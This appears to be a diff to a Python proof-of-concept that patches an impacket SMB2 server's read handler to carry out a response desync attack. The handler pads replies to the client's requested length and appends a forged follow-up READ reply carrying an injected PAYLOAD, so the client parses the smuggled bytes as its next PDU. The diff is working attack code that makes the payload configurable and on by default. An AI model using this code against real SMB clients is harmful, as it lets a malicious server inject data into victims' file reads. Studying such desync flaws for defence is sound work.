@@ -47,9 +47,10 @@ DLEN = 0
 if "--dlen" in sys.argv:
     DLEN = int(sys.argv[sys.argv.index("--dlen") + 1])
 INJECT = b""
-MIDOFF = 1
-if "--inject" in sys.argv:
-    INJECT = open(sys.argv[sys.argv.index("--inject") + 1], "rb").read()
+MIDOFF = 3
+PAYLOAD = b"INJECTED\r\n"
+if "--payload" in sys.argv:
+    PAYLOAD = open(sys.argv[sys.argv.index("--payload") + 1], "rb").read()
 if "--midoff" in sys.argv:
     MIDOFF = int(sys.argv[sys.argv.index("--midoff") + 1])
 
@@ -80,7 +81,7 @@ _ORIG_RD = SMB2Commands.smb2Read
 
 def patched_rd(connId, smbServer, recvPacket):
     res = _ORIG_RD(connId, smbServer, recvPacket)
-    if DLEN or INJECT:
+    if DLEN or INJECT or PAYLOAD:
         try:
             resp = res[0][0]
             raw = resp['Buffer']
@@ -88,7 +89,7 @@ def patched_rd(connId, smbServer, recvPacket):
                 raw = raw.getData()
             buf = bytearray(raw)
             real = len(buf)
-            if INJECT and real:
+            if (INJECT or PAYLOAD) and real:
                 # desync injection: client requested 65535; it consumes exactly
                 # 65535 bytes of the reply; anything beyond stays in the socket
                 # and is parsed as the NEXT PDU. Pad the payload to 65535 then
@@ -101,7 +102,7 @@ def patched_rd(connId, smbServer, recvPacket):
                     tid = recvPacket['TreeID']
                 except Exception:
                     mid, sid, tid = 0, 0, 0
-                frame = build_followup_read_reply(mid + MIDOFF, sid, tid)
+                frame = build_followup_read_reply(mid + MIDOFF, sid, tid, PAYLOAD)
                 buf = buf + b"\x00" * max(0, REQ - len(buf)) + frame
                 resp['Buffer'] = bytes(buf)
                 resp['DataLength'] = len(buf)
@@ -115,7 +116,7 @@ def patched_rd(connId, smbServer, recvPacket):
     return res
 
 
-if DLEN or INJECT:
+if DLEN or INJECT or PAYLOAD:
     SMB2Commands.smb2Read = staticmethod(patched_rd)
 
 
